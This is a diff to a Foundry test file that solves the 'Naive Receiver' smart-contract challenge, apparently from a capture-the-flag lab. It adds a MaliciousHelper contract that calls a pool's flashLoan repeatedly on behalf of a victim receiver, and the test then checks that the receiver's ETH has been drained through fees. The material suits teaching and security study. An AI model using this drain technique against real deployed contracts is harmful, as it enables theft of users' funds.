@@ -48,7 +48,11 @@ contract NaiveReceiver is Test {
         /**
          * EXPLOIT START *
          */
+        vm.startPrank(attacker);
 
+        MaliciousHelper helper = new MaliciousHelper(address(naiveReceiverLenderPool), address(flashLoanReceiver));
+
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
@@ -60,5 +64,14 @@ contract NaiveReceiver is Test {
         // All ETH has been drained from the receiver
         assertEq(address(flashLoanReceiver).balance, 0);
         assertEq(address(naiveReceiverLenderPool).balance, ETHER_IN_POOL + ETHER_IN_RECEIVER);
+    }
+}
+
+contract MaliciousHelper {
+    constructor(address pool, address target) {
+        uint256 targetEthBalance = target.balance / 1e18;
+        for (uint256 i = 0; i < targetEthBalance; i++) {
+            pool.call(abi.encodeWithSignature("flashLoan(address,uint256)", target, 0));
+        }
     }
 }
